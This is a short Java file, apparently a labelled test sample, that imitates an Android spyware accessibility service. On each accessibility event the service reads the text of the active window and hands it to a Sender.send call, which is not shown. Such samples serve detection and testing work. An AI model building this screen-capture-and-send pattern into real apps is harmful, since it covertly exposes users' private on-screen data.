package sim.packpeek.undangan;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

/** TEST SAMPLE ONLY. Imitates screen reading by an accessibility service; never runs. */
public class ScreenService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) Sender.send(String.valueOf(root.getText()));
    }

    @Override
    public void onInterrupt() {}
}
